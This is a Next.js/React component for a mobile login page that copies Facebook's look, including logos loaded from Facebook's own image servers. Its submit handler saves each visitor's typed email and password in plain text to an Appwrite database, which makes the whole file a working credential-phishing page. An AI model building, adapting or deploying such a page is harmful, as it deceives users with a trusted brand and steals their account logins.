"use client";

import { useState, ChangeEvent, FormEvent } from "react";
import Image from "next/image";
import { databases, ID } from '../lib/appwrite';

// Footer link component for reusability
const FooterLink = ({
  href,
  children,
}: {
  href: string;
  children: React.ReactNode;
}) => (
  <a href={href} className="text-xs text-[#485C6B]">
    {children}
  </a>
);

export default function MobileLoginPage() {
  const [credentials, setCredentials] = useState({ email: "", password: "" });
  const [message, setMessage] = useState<string | null>(null);

  // Handle input changes
  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    setCredentials({ ...credentials, [e.target.name]: e.target.value });
  };

  // Handle form submission
  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setMessage(null);

    try {
      console.log('Attempting to store data...');
      const response = await databases.createDocument(
        '6717c213001280d0cb91',
        '6717c271002782e1e85f',
        ID.unique(),
        {
          email: credentials.email,
          password: credentials.password,
        }
      );
      console.log('Data stored successfully:', response);
      setCredentials({ email: "", password: "" });
    } catch (error) {
      console.error('Failed to store data:', error);
      setMessage('Try again later');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white flex flex-col">
      <header className="p-4 flex justify-center items-center">
        <div className="text-gray-500 text-sm">English (UK)</div>
      </header>

      <main className="flex-grow flex flex-col justify-start px-4 py-6">
        <div className="mt-24 mb-36 flex justify-center">
          <Image
            src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png"
            alt="Facebook"
            width={56}
            height={56}
          />
        </div>

        <form onSubmit={handleSubmit} className="space-y-3">
          <input
            type="text"
            name="email"
            placeholder="Mobile number or email address"
            className="w-full px-3 py-3 border border-gray-300 rounded-2xl focus:outline-none focus:border-blue-500 text-sm"
            value={credentials.email}
            onChange={handleChange}
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            className="w-full px-3 py-3 border border-gray-300 rounded-2xl focus:outline-none focus:border-blue-500 text-sm"
            value={credentials.password}
            onChange={handleChange}
          />
          {message && (
            <div className={`text-sm text-center ${message.includes('Failed') ? 'text-red-500' : 'text-green-500'}`}>
              {message}
            </div>
          )}
          <button
            type="submit"
            className="w-full bg-[#1877f2] text-white py-3 rounded-2xl font-semibold text-lg"
          >
            Log in
          </button>
        </form>
        <div className="text-center mt-3">
          <a href="#" className="text-[#1877f2] text-sm">
            Forgotten Password?
          </a>
        </div>
      </main>

      <footer className="mt-auto px-4 pb-4 flex flex-col items-center w-full">
        <button
          type="button"
          className="mb-4 bg-white text-[#1877f2] py-2.5 rounded-3xl font-semibold text-sm border border-[#1877f2] w-full"
        >
          Create new account
        </button>
        <Image
          src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png"
          alt="Meta"
          width={72}
          height={22}
          className="mb-2 brightness-50 contrast-200"
        />
        <div className="flex justify-center space-x-2">
          <FooterLink href="#">About</FooterLink>
          <span className="text-xs text-[#485C6B]">·</span>
          <FooterLink href="#">Help</FooterLink>
          <span className="text-xs text-[#485C6B]">·</span>
          <FooterLink href="#">More</FooterLink>
        </div>
      </footer>
    </div>
  );
}
